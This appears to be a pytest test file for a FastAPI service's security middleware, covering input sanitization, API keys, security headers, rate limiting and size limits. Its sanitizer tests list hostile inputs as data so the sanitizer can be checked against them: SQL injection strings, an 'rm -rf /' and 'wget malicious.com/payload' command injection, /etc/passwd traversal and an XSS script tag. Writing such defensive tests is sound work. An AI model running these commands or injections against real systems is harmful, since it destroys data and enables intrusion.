"""
Unit tests for security middleware.
"""

import pytest
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient
from middleware.security import (
    InputSanitizer,
    RateLimitMiddleware,
    SecurityHeadersMiddleware,
    RequestSizeLimitMiddleware,
)
from middleware.auth import APIKeyStore, APIKey


# ── Input Sanitization Tests ──────────────────────────────────────────────────

class TestInputSanitizer:
    """Test input sanitization logic."""
    
    def test_sanitize_alert_valid(self):
        """Test sanitization of valid alert text."""
        alert = "Port scan detected from 192.168.1.1"
        result = InputSanitizer.sanitize_alert(alert)
        assert result == alert
    
    def test_sanitize_alert_empty(self):
        """Test that empty alerts are rejected."""
        from fastapi import HTTPException
        
        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_alert("")
        
        assert exc_info.value.status_code == 400
        assert "cannot be empty" in exc_info.value.detail
    
    def test_sanitize_alert_too_long(self):
        """Test that overly long alerts are rejected."""
        from fastapi import HTTPException
        
        long_alert = "A" * 60000
        with pytest.raises(HTTPException) as exc_info:
            InputSanitizer.sanitize_alert(long_alert)
        
        assert exc_info.value.status_code == 400
        assert "too long" in exc_info.value.detail
    
    def test_sanitize_alert_sql_injection(self):
        """Test that SQL injection patterns are detected."""
        from fastapi import HTTPException
        
        malicious_alerts = [
            "' OR '1'='1",
            "'; DROP TABLE incidents--",
            "UNION SELECT * FROM users",
        ]
        
        for alert in malicious_alerts:
            with pytest.raises(HTTPException) as exc_info:
                InputSanitizer.sanitize_alert(alert)
            
            assert exc_info.value.status_code == 400
            assert "SQL" in exc_info.value.detail
    
    def test_sanitize_alert_command_injection(self):
        """Test that command injection patterns are detected."""
        from fastapi import HTTPException
        
        malicious_alerts = [
            "alert; rm -rf /",
            "alert && wget malicious.com/payload",
            "../../etc/passwd",
        ]
        
        for alert in malicious_alerts:
            with pytest.raises(HTTPException) as exc_info:
                InputSanitizer.sanitize_alert(alert)
            
            assert exc_info.value.status_code == 400
            assert "command" in exc_info.value.detail.lower()
    
    def test_sanitize_filename(self):
        """Test filename sanitization."""
        assert InputSanitizer.sanitize_filename("../../../etc/passwd") == "etcpasswd"
        assert InputSanitizer.sanitize_filename("file<>:.txt") == "file.txt"
        assert InputSanitizer.sanitize_filename("normal_file.pdf") == "normal_file.pdf"
    
    def test_escape_html(self):
        """Test HTML escaping."""
        html = '<script>alert("XSS")</script>'
        escaped = InputSanitizer.escape_html(html)
        assert "<script>" not in escaped
        assert "&lt;script&gt;" in escaped


# ── API Key Store Tests ───────────────────────────────────────────────────────

class TestAPIKeyStore:
    """Test API key management."""
    
    def test_create_key(self):
        """Test creating a new API key."""
        store = APIKeyStore()
        
        api_key = store.create_key(
            name="Test Key",
            permissions=["read", "write"]
        )
        
        assert api_key.key.startswith("sk_")
        assert api_key.name == "Test Key"
        assert "read" in api_key.permissions
        assert "write" in api_key.permissions
    
    def test_validate_key_success(self):
        """Test validating a valid API key."""
        store = APIKeyStore()
        api_key = store.create_key("Test", ["read"])
        
        validated = store.validate_key(api_key.key)
        assert validated is not None
        assert validated.key == api_key.key
    
    def test_validate_key_invalid(self):
        """Test validating an invalid API key."""
        store = APIKeyStore()
        
        validated = store.validate_key("invalid_key")
        assert validated is None
    
    def test_validate_key_expired(self):
        """Test validating an expired API key."""
        from datetime import datetime, timedelta
        
        store = APIKeyStore()
        api_key = store.create_key("Test", ["read"], expires_days=-1)
        
        # Manually set expiration to past
        api_key.expires_at = datetime.utcnow() - timedelta(days=1)
        store._keys[api_key.key] = api_key
        
        validated = store.validate_key(api_key.key)
        assert validated is None
    
    def test_revoke_key(self):
        """Test revoking an API key."""
        store = APIKeyStore()
        api_key = store.create_key("Test", ["read"])
        
        assert store.revoke_key(api_key.key) is True
        assert store.validate_key(api_key.key) is None
    
    def test_revoke_nonexistent_key(self):
        """Test revoking a non-existent key."""
        store = APIKeyStore()
        assert store.revoke_key("nonexistent") is False


# ── Security Headers Middleware Tests ─────────────────────────────────────────

class TestSecurityHeadersMiddleware:
    """Test security headers middleware."""
    
    def test_security_headers_added(self):
        """Test that security headers are added to responses."""
        app = FastAPI()
        app.add_middleware(SecurityHeadersMiddleware)
        
        @app.get("/test")
        def test_endpoint():
            return {"status": "ok"}
        
        client = TestClient(app)
        response = client.get("/test")
        
        # Check security headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"
        assert response.headers["X-XSS-Protection"] == "1; mode=block"
        assert "Strict-Transport-Security" in response.headers
        assert "Content-Security-Policy" in response.headers


# ── Rate Limiting Middleware Tests ────────────────────────────────────────────

class TestRateLimitMiddleware:
    """Test rate limiting middleware."""
    
    def test_rate_limit_not_exceeded(self):
        """Test that requests within limit succeed."""
        app = FastAPI()
        app.add_middleware(RateLimitMiddleware, requests_per_minute=10)
        
        @app.get("/test")
        def test_endpoint():
            return {"status": "ok"}
        
        client = TestClient(app)
        
        # Make 5 requests (under limit of 10)
        for _ in range(5):
            response = client.get("/test")
            assert response.status_code == 200
    
    def test_rate_limit_exceeded(self):
        """Test that requests over limit are blocked."""
        app = FastAPI()
        app.add_middleware(RateLimitMiddleware, requests_per_minute=5)
        
        @app.get("/test")
        def test_endpoint():
            return {"status": "ok"}
        
        client = TestClient(app)
        
        # Make 5 requests (at limit)
        for _ in range(5):
            response = client.get("/test")
            assert response.status_code == 200
        
        # 6th request should be rate limited
        response = client.get("/test")
        assert response.status_code == 429
        assert "rate limit" in response.json()["detail"].lower()


# ── Request Size Limit Middleware Tests ───────────────────────────────────────

class TestRequestSizeLimitMiddleware:
    """Test request size limiting."""
    
    def test_request_within_size_limit(self):
        """Test that small requests are allowed."""
        app = FastAPI()
        app.add_middleware(RequestSizeLimitMiddleware, max_size_mb=1)
        
        @app.post("/test")
        def test_endpoint(data: dict):
            return {"status": "ok"}
        
        client = TestClient(app)
        response = client.post("/test", json={"data": "small payload"})
        
        assert response.status_code == 200
    
    def test_request_exceeds_size_limit(self):
        """Test that large requests are rejected."""
        app = FastAPI()
        app.add_middleware(RequestSizeLimitMiddleware, max_size_mb=0.001)  # 1KB limit
        
        @app.post("/test")
        def test_endpoint(data: dict):
            return {"status": "ok"}
        
        client = TestClient(app)
        
        # Create a large payload (>1KB)
        large_payload = {"data": "A" * 2000}
        
        response = client.post("/test", json=large_payload)
        assert response.status_code == 413  # Request Entity Too Large
